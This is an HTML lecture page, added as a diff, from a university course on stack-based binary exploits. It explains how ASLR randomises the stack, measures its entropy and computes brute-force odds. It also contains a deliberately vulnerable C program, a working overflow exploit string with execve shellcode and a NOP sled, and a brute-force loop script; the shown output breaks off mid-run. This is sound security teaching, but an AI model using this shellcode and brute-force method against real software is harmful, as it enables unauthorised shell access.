@@ -1,0 +1,904 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<!-- 2015-10-27 Tue 10:40 -->
+<meta  http-equiv="Content-Type" content="text/html;charset=utf-8">
+<meta  name="viewport" content="width=device-width, initial-scale=1">
+<title>Lec. 16: Address Space Layout Randomization</title>
+<meta  name="generator" content="Org-mode">
+<meta  name="author" content="Adam Aviv">
+<style type="text/css">
+ <!--/*--><![CDATA[/*><!--*/
+  .title  { text-align: center;
+             margin-bottom: .2em; }
+  .subtitle { text-align: center;
+              font-size: medium;
+              font-weight: bold;
+              margin-top:0; }
+  .todo   { font-family: monospace; color: red; }
+  .done   { font-family: monospace; color: green; }
+  .priority { font-family: monospace; color: orange; }
+  .tag    { background-color: #eee; font-family: monospace;
+            padding: 2px; font-size: 80%; font-weight: normal; }
+  .timestamp { color: #bebebe; }
+  .timestamp-kwd { color: #5f9ea0; }
+  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
+  .underline { text-decoration: underline; }
+  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
+  p.verse { margin-left: 3%; }
+  pre {
+    border: 1px solid #ccc;
+    box-shadow: 3px 3px 3px #eee;
+    padding: 8pt;
+    font-family: monospace;
+    overflow: auto;
+    margin: 1.2em;
+  }
+  pre.src {
+    position: relative;
+    overflow: visible;
+    padding-top: 1.2em;
+  }
+  pre.src:before {
+    display: none;
+    position: absolute;
+    background-color: white;
+    top: -10px;
+    right: 10px;
+    padding: 3px;
+    border: 1px solid black;
+  }
+  pre.src:hover:before { display: inline;}
+  pre.src-sh:before    { content: 'sh'; }
+  pre.src-bash:before  { content: 'sh'; }
+  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
+  pre.src-R:before     { content: 'R'; }
+  pre.src-perl:before  { content: 'Perl'; }
+  pre.src-java:before  { content: 'Java'; }
+  pre.src-sql:before   { content: 'SQL'; }
+
+  table { border-collapse:collapse; }
+  caption.t-above { caption-side: top; }
+  caption.t-bottom { caption-side: bottom; }
+  td, th { vertical-align:top;  }
+  th.org-right  { text-align: center;  }
+  th.org-left   { text-align: center;   }
+  th.org-center { text-align: center; }
+  td.org-right  { text-align: right;  }
+  td.org-left   { text-align: left;   }
+  td.org-center { text-align: center; }
+  dt { font-weight: bold; }
+  .footpara { display: inline; }
+  .footdef  { margin-bottom: 1em; }
+  .figure { padding: 1em; }
+  .figure p { text-align: center; }
+  .inlinetask {
+    padding: 10px;
+    border: 2px solid gray;
+    margin: 10px;
+    background: #ffffcc;
+  }
+  #org-div-home-and-up
+   { text-align: right; font-size: 70%; white-space: nowrap; }
+  textarea { overflow-x: auto; }
+  .linenr { font-size: smaller }
+  .code-highlighted { background-color: #ffff00; }
+  .org-info-js_info-navigation { border-style: none; }
+  #org-info-js_console-label
+    { font-size: 10px; font-weight: bold; white-space: nowrap; }
+  .org-info-js_search-highlight
+    { background-color: #ffff00; color: #000000; font-weight: bold; }
+  /*]]>*/-->
+</style>
+<link rel="stylesheet" type="text/css" href="../class.css" />
+<link rel="stylesheet" type="text/css" href="../print.css" media="print" />
+<div class="page-head">
+SI485H: Stack Based Binary Exploits and Defenses (F15)
+</div>
+<hr>
+<a href="../../index.html">Home</a> <a href="../../policy.html">Policy</a> <a href="../../cal.html">Calendar</a>  <a href="../../rsc/index.html">Resources</a>
+<hr>
+<script type="text/javascript">
+/*
+@licstart  The following is the entire license notice for the
+JavaScript code in this tag.
+
+Copyright (C) 2012-2013 Free Software Foundation, Inc.
+
+The JavaScript code in this tag is free software: you can
+redistribute it and/or modify it under the terms of the GNU
+General Public License (GNU GPL) as published by the Free Software
+Foundation, either version 3 of the License, or (at your option)
+any later version.  The code is distributed WITHOUT ANY WARRANTY;
+without even the implied warranty of MERCHANTABILITY or FITNESS
+FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.
+
+As additional permission under GNU GPL version 3 section 7, you
+may distribute non-source (e.g., minimized or compacted) forms of
+that code without the copy of the GNU GPL normally required by
+section 4, provided you include this license notice and a URL
+through which recipients can access the Corresponding Source.
+
+
+@licend  The above is the entire license notice
+for the JavaScript code in this tag.
+*/
+<!--/*--><![CDATA[/*><!--*/
+ function CodeHighlightOn(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(null != target) {
+     elem.cacheClassElem = elem.className;
+     elem.cacheClassTarget = target.className;
+     target.className = "code-highlighted";
+     elem.className   = "code-highlighted";
+   }
+ }
+ function CodeHighlightOff(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(elem.cacheClassElem)
+     elem.className = elem.cacheClassElem;
+   if(elem.cacheClassTarget)
+     target.className = elem.cacheClassTarget;
+ }
+/*]]>*///-->
+</script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        displayAlign: "center",
+        displayIndent: "5em",
+
+        "HTML-CSS": { scale: 100,
+                        linebreaks: { automatic: "false" },
+                        webFont: "Neo-Euler"
+                       },
+        SVG: {scale: 100,
+              linebreaks: { automatic: "false" },
+              font: "Neo-Euler"},
+        NativeMML: {scale: 100},
+        TeX: { equationNumbers: {autoNumber: "AMS"},
+               MultLineWidth: "85%",
+               TagSide: "right",
+               TagIndent: ".8em"
+             }
+});
+</script>
+<script type="text/javascript"
+        src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS_HTML"></script>
+</head>
+<body>
+<div id="content">
+<h1 class="title">Lec. 16: Address Space Layout Randomization</h1>
+<div id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#orgheadline1">1. ASLR: Address Space Layout Randomization</a></li>
+<li><a href="#orgheadline5">2. How random is random really?</a>
+<ul>
+<li><a href="#orgheadline2">2.1. Bits of Entropy</a></li>
+<li><a href="#orgheadline3">2.2. Probability of Success</a></li>
+<li><a href="#orgheadline4">2.3. On ASLR and NOP sleds</a></li>
+</ul>
+</li>
+<li><a href="#orgheadline6">3. Brute Forcing</a></li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-orgheadline1" class="outline-2">
+<h2 id="orgheadline1"><span class="section-number-2">1</span> ASLR: Address Space Layout Randomization</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+So far this semester we've turning off a bunch of security features
+that have made a lot of our exploits a lot easier. This lesson, we are
+going to turn one of those: Address Space Layout Randomization, or ASLR.
+</p>
+
+<p>
+The purpose of ASLR is to increase the difficulty of performing buffer
+overflow by randomizing the mapping of the memory at processes load
+time. What this means practically is that if you have are performing
+an exploit like so
+</p>
+<pre class="example">
+                                          .-----------.
+                                          |           |
+                                          |           v
+./vulnerable 5 &lt;--------padding-----&gt;&lt;return-address&gt;&lt;shell code&gt;
+</pre>
+<p>
+where you are overwriting the return address with another value on the
+stack, the address of your shell code will move around. Clearly, this
+will make things more difficult, but we've got tools to get around this.
+</p>
+
+<p>
+In today's lesson we are going to first see how ASLR is ineffective at
+preventing our attacks for the simple reason that probabilities are on
+are side &#x2014; the so called birthday paradox. It also turns out that in
+some situations, we don't actually have to guess anything. We can
+leverage the non-randomized parts of the program to do our dirty work
+for us.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline5" class="outline-2">
+<h2 id="orgheadline5"><span class="section-number-2">2</span> How random is random really?</h2>
+<div class="outline-text-2" id="text-2">
+<p>
+The first thing to do is to investigate how ASLR works. To do that, we
+need to first understand a bit how memory is <i>mapped</i> for a
+process. Every process has a memory map, managed by the kernel, which
+describes what parts of the memory address space are accessible. We
+can actually look at the maps of a process use the <code>/proc</code> file
+system. 
+</p>
+
+<p>
+To do so, we'll consider a small program that just busy waits, which
+we can run in the background, and then we can look at its maps.
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./busy_wait &amp;
+[4] 7984
+[3]   Terminated              ./busy_wait
+user@si485H-base:demo$ cat /proc/7984/maps
+08048000-08049000 r-xp 00000000 08:01 321977     /home/user/git/si485-binary-exploits/lec/16/demo/busy_wait
+08049000-0804a000 r-xp 00000000 08:01 321977     /home/user/git/si485-binary-exploits/lec/16/demo/busy_wait
+0804a000-0804b000 rwxp 00001000 08:01 321977     /home/user/git/si485-binary-exploits/lec/16/demo/busy_wait
+b7e19000-b7e1a000 rwxp 00000000 00:00 0 
+b7e1a000-b7fc2000 r-xp 00000000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
+b7fc2000-b7fc4000 r-xp 001a8000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
+b7fc4000-b7fc5000 rwxp 001aa000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
+b7fc5000-b7fc8000 rwxp 00000000 00:00 0 
+b7fdb000-b7fdd000 rwxp 00000000 00:00 0 
+b7fdd000-b7fde000 r-xp 00000000 00:00 0          [vdso]
+b7fde000-b7ffe000 r-xp 00000000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
+b7ffe000-b7fff000 r-xp 0001f000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
+b7fff000-b8000000 rwxp 00020000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
+bffdf000-c0000000 rwxp 00000000 00:00 0          [stack]
+</pre>
+
+<p>
+You notice some maps are familiar, such as the stack, and also some
+libraries, like <code>libc</code>. Additionally, you'll see the program code
+itself, e.g., the binary file, is also mapped into memory. This is the
+entire address space layout as we've seen it so far, and if we were to
+try and access out of bounds of this area, we would get a segmentation
+fault. 
+</p>
+
+<p>
+Also, the memory space is not randomized. We can see that is the case
+if we were to run this program again and look at the maps:
+</p>
+<pre class="example">
+user@si485H-base:demo$ killall busy_wait
+user@si485H-base:demo$ ./busy_wait &amp;
+[5] 7988
+[4]   Terminated              ./busy_wait
+user@si485H-base:demo$ cat /proc/7988/maps
+08048000-08049000 r-xp 00000000 08:01 321977     /home/user/git/si485-binary-exploits/lec/16/demo/busy_wait
+08049000-0804a000 r-xp 00000000 08:01 321977     /home/user/git/si485-binary-exploits/lec/16/demo/busy_wait
+0804a000-0804b000 rwxp 00001000 08:01 321977     /home/user/git/si485-binary-exploits/lec/16/demo/busy_wait
+b7e19000-b7e1a000 rwxp 00000000 00:00 0 
+b7e1a000-b7fc2000 r-xp 00000000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
+b7fc2000-b7fc4000 r-xp 001a8000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
+b7fc4000-b7fc5000 rwxp 001aa000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
+b7fc5000-b7fc8000 rwxp 00000000 00:00 0 
+b7fdb000-b7fdd000 rwxp 00000000 00:00 0 
+b7fdd000-b7fde000 r-xp 00000000 00:00 0          [vdso]
+b7fde000-b7ffe000 r-xp 00000000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
+b7ffe000-b7fff000 r-xp 0001f000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
+b7fff000-b8000000 rwxp 00020000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
+bffdf000-c0000000 rwxp 00000000 00:00 0          [stack]
+</pre>
+
+<p>
+Same mappings. Now, let's turn on address space randomization.
+</p>
+<pre class="example">
+user@si485H-base:demo$ echo 2 | sudo tee /proc/sys/kernel/randomize_va_space 
+2
+</pre>
+
+<p>
+If we were to look at the maps again, this time the picture is a bit different:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./busy_wait &amp;
+[2] 7999
+user@si485H-base:demo$ cat /proc/7999/maps
+08048000-08049000 r-xp 00000000 08:01 321977     /home/user/git/si485-binary-exploits/lec/16/demo/busy_wait
+08049000-0804a000 r-xp 00000000 08:01 321977     /home/user/git/si485-binary-exploits/lec/16/demo/busy_wait
+0804a000-0804b000 rwxp 00001000 08:01 321977     /home/user/git/si485-binary-exploits/lec/16/demo/busy_wait
+b75cf000-b75d0000 rwxp 00000000 00:00 0 
+b75d0000-b7778000 r-xp 00000000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
+b7778000-b777a000 r-xp 001a8000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
+b777a000-b777b000 rwxp 001aa000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
+b777b000-b777e000 rwxp 00000000 00:00 0 
+b7791000-b7793000 rwxp 00000000 00:00 0 
+b7793000-b7794000 r-xp 00000000 00:00 0          [vdso]
+b7794000-b77b4000 r-xp 00000000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
+b77b4000-b77b5000 r-xp 0001f000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
+b77b5000-b77b6000 rwxp 00020000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
+bf8fb000-bf91c000 rwxp 00000000 00:00 0          [stack]
+</pre>
+
+<p>
+In particular, as we care most about the stack, the stack address has
+changed significantly. Interesting, the address of the text segment
+has not (which will be important later). If we were to run this a
+bunch of times, we'd start to see that every time we run the program,
+we get different values of the stack. Here's a script to do that:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh"><span style="color: #ff7f24;">#</span><span style="color: #ff7f24;">!/bin/</span><span style="color: #00ffff;">bash</span>
+<span style="color: #00ffff;">for</span> i<span style="color: #00ffff;"> in</span> <span style="color: #fa8072;">`seq 1 1 25`</span> <span style="color: #ff7f24;">#</span><span style="color: #ff7f24;">loop 25 times</span>
+ <span style="color: #00ffff;">do</span> 
+    ./busy_wait &amp; <span style="color: #ff7f24;">#</span><span style="color: #ff7f24;">run busywait</span>
+    <span style="color: #eedd82;">pid</span>=$<span style="color: #eedd82;">!</span> <span style="color: #ff7f24;">#</span><span style="color: #ff7f24;">get its pid</span>
+    cat /proc/$<span style="color: #eedd82;">pid</span>/maps | grep stack <span style="color: #ff7f24;">#</span><span style="color: #ff7f24;">report its mapping for the stack</span>
+    <span style="color: #b0c4de;">kill</span> -9 $<span style="color: #eedd82;">pid</span>
+<span style="color: #00ffff;">done</span>
+</pre>
+</div>
+
+<p>
+And the output:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./rand_stack.sh 2&gt;/dev/null
+bf8d5000-bf8f6000 rwxp 00000000 00:00 0          [stack]
+bfa39000-bfa5a000 rwxp 00000000 00:00 0          [stack]
+bfa02000-bfa23000 rwxp 00000000 00:00 0          [stack]
+bfe62000-bfe83000 rwxp 00000000 00:00 0          [stack]
+bf99d000-bf9be000 rwxp 00000000 00:00 0          [stack]
+bf9f7000-bfa18000 rwxp 00000000 00:00 0          [stack]
+bfbd9000-bfbfa000 rwxp 00000000 00:00 0          [stack]
+bfbdb000-bfbfc000 rwxp 00000000 00:00 0          [stack]
+bfc18000-bfc39000 rwxp 00000000 00:00 0          [stack]
+bfaaa000-bfacb000 rwxp 00000000 00:00 0          [stack]
+bfd70000-bfd91000 rwxp 00000000 00:00 0          [stack]
+bfe83000-bfea4000 rwxp 00000000 00:00 0          [stack]
+bf96f000-bf990000 rwxp 00000000 00:00 0          [stack]
+bfc28000-bfc49000 rwxp 00000000 00:00 0          [stack]
+bfae4000-bfb05000 rwxp 00000000 00:00 0          [stack]
+bfd1a000-bfd3b000 rwxp 00000000 00:00 0          [stack]
+bfd38000-bfd59000 rwxp 00000000 00:00 0          [stack]
+bfce7000-bfd08000 rwxp 00000000 00:00 0          [stack]
+bff97000-bffb8000 rwxp 00000000 00:00 0          [stack]
+bfb1e000-bfb3f000 rwxp 00000000 00:00 0          [stack]
+bfdc8000-bfde9000 rwxp 00000000 00:00 0          [stack]
+bfec7000-bfee8000 rwxp 00000000 00:00 0          [stack]
+bfd5d000-bfd7e000 rwxp 00000000 00:00 0          [stack]
+bfd79000-bfd9a000 rwxp 00000000 00:00 0          [stack]
+bfb1e000-bfb3f000 rwxp 00000000 00:00 0          [stack]
+</pre>
+</div>
+
+<div id="outline-container-orgheadline2" class="outline-3">
+<h3 id="orgheadline2"><span class="section-number-3">2.1</span> Bits of Entropy</h3>
+<div class="outline-text-3" id="text-2-1">
+<p>
+You may notice from above that while there is randomness in the
+placement of the stack, there is not a <i>huge</i> amount of
+randomness. The question at hand is how much randomness is really
+there? Or, more generally, how many bits in the address are really
+random?
+</p>
+
+<p>
+To do that, let's look at a more simple program:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c" id="orgsrcblock1"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(){
+
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">a</span> =10;
+
+  printf(<span style="color: #ffa07a;">"%p\n"</span>,&amp;a);
+
+}
+</pre>
+</div>
+
+<p>
+The program just prints the address of a stack defined variable. If we
+were to run this program once or twice we can see that we are getting
+different values each time:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./rand_sample 
+0xbffe6f4c
+user@si485H-base:demo$ ./rand_sample 
+0xbf8e514c
+user@si485H-base:demo$ ./rand_sample 
+0xbffcfbbc
+user@si485H-base:demo$ ./rand_sample 
+0xbfb34d6c
+</pre>
+
+<p>
+Now, let's take this a bit further. Here's a python program that will
+read in these values and determine which of the bits are actually
+changing across runs:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-Py" id="orgsrcblock2">#!/usr/bin/python
+
+import sys
+
+def to_bin(v):
+    r = ""
+    for i in range(32):
+	r += str( v &amp; 0x1)
+	v &gt;&gt;= 1
+
+    return "".join(reversed(r))
+
+last = None
+changed = list(to_bin(0xFFFFFFFF))
+addr = 0xFFFFFFFF
+for l in sys.stdin:
+    a = int(l.strip(),16)
+
+    addr &amp;= a
+
+
+    if last == None:
+	last = list(to_bin(a))
+    else:
+	cur = list(to_bin(a))
+	for i in range(32):
+	    if last[i] != cur[i]:
+		changed[i] = "0"
+
+
+
+
+ print "Consitent: ", to_bin(addr), hex(addr)
+ print "  Changed: ", "".join(changed), 32-sum(map(int,changed))
+</pre>
+</div>
+
+<p>
+Bringing these program together:
+</p>
+<pre class="example">
+user@si485H-base:demo$ for i in `seq 1 1 100`; do ./rand_sample ; done | python random_bits.py 
+Consitent:  10111111100000000000000000001100 0xbf80000c
+  Changed:  11111111100000000000000000001111 19
+</pre>
+<p>
+We see that the prefix 0xbf8 and the suffix 0xc persist across
+runs. In total, only 19 of the 32 bits is random. This is a big
+difference. Consider that if there was truly 32 bits of randomness,
+that means there could be 2<sup>32</sup> possible values to guess, or roughly 4
+billion.
+</p>
+
+<p>
+On the other hand, 2<sup>19</sup> is a more tractable number. That's only
+roughly half a million, which on face value may seam like a lot, but
+it is significantly smaller than 4 billion. More so, we only have to
+be right once to exploit the program, and the probability that we are
+right increases exponentially with each guess. 
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline3" class="outline-3">
+<h3 id="orgheadline3"><span class="section-number-3">2.2</span> Probability of Success</h3>
+<div class="outline-text-3" id="text-2-2">
+<p>
+The next question is, given that there are only 19 bits of randomness
+to play with here, what is our probability of correctly guessing the
+right return address.
+</p>
+
+<p>
+With one guess, that would be 2<sup>(-19)</sup> or 1/524288, which doesn't seem
+that good, but we're talking about computers here, so we guess a lot
+of times. To see how this probability changes in the number of guesses
+we make, we can treat this like an expectation of a geometric
+probability calculation. 
+</p>
+
+<p>
+The idea is that if we were to make <code>n</code> guesses, what is probability
+that we get the right address at least once. At least once
+calculations are a bit tough to do, generally, but the inverse
+probability is easier. Instead, lets consider the probability of never
+getting the address right, and the inverse of that probability would
+be the same as getting it right <i>at least</i> once.
+</p>
+
+<p>
+The probability of not guessing correctly is calculated as one minus
+the probability of guessing correctly (or <code>q</code>):
+</p>
+
+\begin{equation*}
+q = 1 - \frac{1}{2^{19}}
+\end{equation*}
+
+<p>
+So if we were to consider the probility in <code>n</code> attempts of <i>not</i>
+getting it right, that would be
+</p>
+
+\begin{equation*}
+1 - q^{\ n}
+\end{equation*}
+
+<p>
+Another way to read this is that after <code>n</code> independent events, each
+with a probability of not guessing correctly, the probability of
+getting at least one right, is the inverse of never getting it right.
+</p>
+
+<p>
+Here is a small python program that does this calculation for us:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-py">#!/usr/bin/python
+
+import sys
+
+if __name__ == "__main__":
+
+    p = float(sys.argv[1])
+    n = int(sys.argv[2])
+
+    q = 1-p
+    for i in range(n+1):
+	prob = 1 - q**(i+1)
+	print i, prob
+</pre>
+</div>
+
+<p>
+Running it for \(2^19\), we can start to see the challenge:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./geometric.py `python -c 'print 1.0/2**19'` 10
+0 1.90734863281e-06
+1 3.81469362765e-06
+2 5.7220349845e-06
+3 7.62937270338e-06
+4 9.53670678439e-06
+5 1.14440372273e-05
+6 1.33513640324e-05
+7 1.52586871995e-05
+8 1.71660067286e-05
+9 1.907332262e-05
+10 2.09806348732e-05
+</pre>
+<p>
+Our odds are pretty bad, but after a few thousands attempts:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./geometric.py `python -c 'print 1.0/2**19'` 1000 | tail 
+991 0.0018903027712
+992 0.00189220651437
+993 0.00189411025391
+994 0.00189601398981
+995 0.00189791772208
+996 0.00189982145073
+997 0.00190172517574
+998 0.00190362889712
+999 0.00190553261487
+1000 0.00190743632898
+
+user@si485H-base:demo$ ./geometric.py `python -c 'print 1.0/2**19'` 10000 | tail 
+9991 0.0188777855858
+9992 0.0188796569279
+9993 0.0188815282665
+9994 0.0188833996014
+9995 0.0188852709328
+9996 0.0188871422607
+9997 0.018889013585
+9998 0.0188908849057
+9999 0.0188927562228
+10000 0.0188946275363
+
+user@si485H-base:demo$ ./geometric.py `python -c 'print 1.0/2**19'` 100000 | tail 
+99991 0.173635885806
+99992 0.173637461971
+99993 0.173639038132
+99994 0.173640614291
+99995 0.173642190446
+99996 0.173643766598
+99997 0.173645342748
+99998 0.173646918894
+99999 0.173648495038
+100000 0.173650071178
+</pre>
+<p>
+Things are starting to look a bit better, but not that
+great. Fortunately, we can do a lot better than this with some careful
+nop-sledding.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline4" class="outline-3">
+<h3 id="orgheadline4"><span class="section-number-3">2.3</span> On ASLR and NOP sleds</h3>
+<div class="outline-text-3" id="text-2-3">
+<p>
+In the calculations before we were only considering the situation
+where we have to get it exactly right, like in the exploit below:
+</p>
+<pre class="example">
+                                          .-----------.
+                                          |           |
+                                          |           v
+./vulnerable 5 &lt;--------padding-----&gt;&lt;return-address&gt;&lt;shell code&gt;
+</pre>
+<p>
+But, we aren't considering the NOP sled, what if we did the following
+with the exploit:
+</p>
+<pre class="example">
+                                          .---------------.
+                                          |               |
+                                          |               v
+./vulnerable 5 &lt;--------padding-----&gt;&lt;return-address&gt;&lt;'\x90' x 65535 &gt; &lt;shell code&gt;
+</pre>
+<p>
+If our nop sled is large enough, we are essentially taking away some
+potential randomness because we are can jump anywhwere in the nop
+sled.  For example, consider if we want to overwrite the return
+address with 0xbfa20000 and we have a nop sled of length 0xffff. Then
+we can jump anywhere between 0xbfa20000 and 0xbfa2fffff and we would
+hit the nop sled and reach our shell code. How many bits of randomness
+remain now?
+</p>
+
+<p>
+From before, we saw that the first 13 bits were fixed with the first 9
+and the last 4. Now we are saying that whatever the last 16 bits in
+the address also doesn't matter as well, overlapping with the
+previously fixed last 4. That leaves <i>only</i> 32-16-9 = 7 bits of randomness to
+contend with, and that ain't much, just 128 possibilities! The
+probabilities really start to work in our favor now:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./geometric.py `python -c 'print 1.0/2**7'` 10 | tail
+1 0.0155639648438
+2 0.0232548713684
+3 0.0308856926858
+4 0.0384568982117
+5 0.0459689536945
+6 0.0534223212437
+7 0.060817459359
+8 0.0681548229578
+9 0.0754348634034
+10 0.0826580285331
+user@si485H-base:demo$ ./geometric.py `python -c 'print 1.0/2**7'` 100 | tail
+91 0.514012476108
+92 0.517809253638
+93 0.521576368844
+94 0.525314053462
+95 0.52902253742
+96 0.532702048846
+97 0.536352814089
+98 0.539975057729
+99 0.543569002591
+100 0.547134869758
+user@si485H-base:demo$ ./geometric.py `python -c 'print 1.0/2**7'` 1000 | tail
+991 0.999582168385
+992 0.999585432694
+993 0.999588671501
+994 0.999591885005
+995 0.999595073404
+996 0.999598236893
+997 0.999601375667
+998 0.99960448992
+999 0.999607579842
+1000 0.999610645625
+</pre>
+<p>
+After a hundred guesses, we have more than 50% probability of getting
+it right at least once! So let's make that happen.
+</p>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgheadline6" class="outline-2">
+<h2 id="orgheadline6"><span class="section-number-2">3</span> Brute Forcing</h2>
+<div class="outline-text-2" id="text-3">
+<p>
+Now that we see how <i>easy</i> it is to guess the right place to jump,
+let's see what it takes to actually brute force this. The first thing
+we need to determine is a good place to set up our exploit. From what
+we've seen, the addresses on the stack can range anywhere between
+0xbf80000 and 0xbfffffff, so let's split the hairs (12-8)/2=2 and 2+8
+is 0xa. So, let's try and jump to an address in the range
+0xbfa00000. We can't send null bytes into our code, so we can use
+0xbfbffff as our overwritten return address, and thus any address in
+the range 0xbfbfffff -&gt; 0xbfa0fffe will work. For the function we are
+going to exploit, we'll use the vulnerable program from earlier lessons, shown
+below:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;string.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">bad</span>(){
+  printf(<span style="color: #ffa07a;">"You've been naughty!\n"</span>);
+}
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">good</span>(){
+  printf(<span style="color: #ffa07a;">"Go Navy!\n"</span>);
+}
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">vuln</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">n</span>, <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">str</span>){
+
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">i</span> = 0;  
+  <span style="color: #98fb98;">char</span> <span style="color: #eedd82;">buf</span>[32];
+
+
+  strcpy(buf,str);
+
+  <span style="color: #00ffff;">while</span>( i &lt; n ){
+    printf(<span style="color: #ffa07a;">"%d %s\n"</span>,i++, buf);
+  }
+
+}
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> *<span style="color: #eedd82;">argv</span>[]){
+
+  vuln(atoi(argv[1]), argv[2]);
+
+  <span style="color: #00ffff;">return</span> 0;
+
+}
+</pre>
+</div>
+
+<p>
+And here is the exploit string we will use:
+</p>
+<pre class="example">
+./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
+</pre>
+<p>
+The embedded shell code is our 21 byte <i>smallest shell code</i>, and we
+will put in 0xffff nop's to increase our chances. Here's a little
+shell script to perform the brute force:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh" id="orgsrcblock3"><span style="color: #ff7f24;">#</span><span style="color: #ff7f24;">!/bin/</span><span style="color: #00ffff;">bash</span>
+
+<span style="color: #b0c4de;">let</span> <span style="color: #eedd82;">i</span>=1
+<span style="color: #00ffff;">while</span> true
+<span style="color: #00ffff;">do</span> 
+    <span style="color: #b0c4de;">echo</span> $<span style="color: #eedd82;">i</span> $(<span style="color: #fa8072;">dmesg</span> | tail -1 | grep -o <span style="color: #ffa07a;">"sp [^ ]* "</span>)  <span style="color: #ff7f24;">#</span><span style="color: #ff7f24;">count plus last failed stack pointer</span>
+    <span style="color: #b0c4de;">echo</span>
+    ./vulnerable 1 <span style="color: #fa8072;">`python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`</span>
+    <span style="color: #b0c4de;">let</span> <span style="color: #eedd82;">i</span>=i+1
+<span style="color: #00ffff;">done</span>
+</pre>
+</div>
+
+<p>
+The script will print out the number of attempts, and also the address
+of the stack pointer on the last failed attempt. And off it goes &#x2026;
+</p>
+<pre class="example">
+./brute_force.sh 
+1 sp bfe6fff0
+
+./brute_force.sh: line 11: 16261 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
+./brute_force.sh: line 10: usleep: command not found
+2 sp bfcf8760
+
+./brute_force.sh: line 11: 16269 Segmentation fault      (core dumped) ./vulnerable 1 `python -c "print 'A'*(0x2c+0x4) + '\xff\xff\xb0\xbf' + '\x90'*0xffff + '\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80'"`
+./brute_force.sh: line 10: usleep: command not found
+3 sp bf809a40
+
